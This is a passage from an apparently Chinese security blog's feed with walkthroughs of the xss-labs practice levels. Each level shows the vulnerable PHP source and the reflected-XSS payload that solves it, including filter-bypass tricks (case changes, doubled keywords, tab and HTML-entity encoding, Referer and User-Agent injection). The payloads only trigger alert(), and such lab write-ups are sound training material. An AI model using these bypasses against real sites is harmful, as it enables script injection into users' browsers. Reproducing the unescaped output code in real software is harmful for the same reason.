&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤掉了<code>script</code>, 空格和<code>/</code>可以考虑使用%0A,%0C,%0D等代替作为分隔符</p>
<p><code>keyword=test&lt;img%0Asrc=1%0Aonclick=alert(1)&gt;</code></p>
<br>

<h4 id="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"><a href="#16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看" class="headerlink" title="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"></a>16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看</h4><p>17.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>18.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>和17题一样</p>
<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>19.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p>20.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs1</title>
    <url>/posts/ca3eea61/</url>
    <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<p>1.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$str被放入到了 h2标签中，只需要把前面h2标签闭合构造payload，</p>
<p><code>name=&lt;/h2&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code></p>
<br>

<p>2.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>闭合value</p>
<p><code>keyword=test&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;</code></p>
<br>

<p>3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>与上一题相比，这里使用了 <code> htmlspecialchars()</code>函数，他会把<code>&lt;</code>和<code>&gt;</code>转译为html实体</p>
<p>查看源码可以发现<code>&lt;</code>和<code>&gt;</code>都被转译掉了，所以在这里可以考虑使用on一类的事件弹xss</p>
<p><code>keyword=&#39;onclick=alert(3)//</code> 闭合前面的value 注释掉后面的单引号</p>
<br>

<p>4.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和上一个差不多，只不过是用双引号闭合</p>
<p><code>keyword=&quot;oninput=alert(4)//</code></p>
<br>

<p>5.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次是把&lt;script 和 on 都给替换了，所以考虑<code>a href</code> 来触发</p>
<p><code>123&quot;&gt;&lt;a href=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<br>

<p>6.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>虽然把href给改了 但可以考虑变化大小写</p>
<p><code>123&quot;&gt;&lt;a hREf=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<p>7.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>123&quot;&gt;&lt;scriscriptpt&gt;alert(7)&lt;/scrscriptipt&gt;//</code></p>
<p><code>123&quot;oonnclick=alert(7) //</code></p>
<br>

<p>8.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>javascrip&amp;#x74;:alert(1)//</code>或者</p>
<p><code>javascr%09ipt:alert(1)</code> %09对关键字隔断 然后进行实体编码<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
<br>

<br>

<p>9.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>与上一关相比多了一个url检测,如果没有带http://就会报错</p>
<p><code>javascrip&amp;#x74;:alert(1)//http://test.com//</code></p>
<p>10</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一题的<code>keyword</code>参数不需要管,只需要控制<code>t_sort</code> </p>
<p><code>t_sort=&quot; onclick=&#39;alert(1)&#39; type=&quot;text&quot;&gt;//</code></p>
<br>

<p>11.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>使用burp修改referer </p>
<p><code>1&quot; type=&quot;text&quot; onclick=alert(1)//</code></p>
<p>12.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span 